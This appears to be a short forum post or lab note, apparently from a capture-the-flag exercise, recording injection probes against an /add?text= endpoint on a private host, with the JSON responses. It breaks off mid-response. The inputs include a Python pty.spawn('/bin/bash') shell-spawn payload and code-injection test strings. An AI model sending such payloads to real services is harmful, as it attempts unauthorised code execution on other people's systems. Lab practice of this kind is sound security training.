Interesting find, using POST: {192.168.8.3:1337/add?text=""} makes the string: "\"\"". The response is:
{
    "Message": "Text added",
    "current_str": "\"\""
}

So if I use /add with 192.168.8.3:1337/add?text="import pty; pty.spawn(\"/bin/bash\")" it returns:
{
    "Message": "Text added",
    "current_str": "\"import pty; pty.spawn(\\\"/bin/bash\\\")\""
}

192.168.8.3:1337/add?text=import uuid; print(uuid.uuid4().hex) returns:
{
    "Message": "Text added",
    "current_str": "\"import uuid; print(uuid.uuid4().hex)"
}

192.168.8.3:1337/add?text="1=1" and import uuid; print(uuid.uuid4().hex) returns:
{
    "Message": "Text added",
    "current_str": "\"1=1\" and import uuid; print(uuid.uuid4().hex)"
}

192.168.8.3:1337/add?text="junk", "uuid":import uuid; print(uuid.uuid4().hex);
{
    "Message": "Text added",
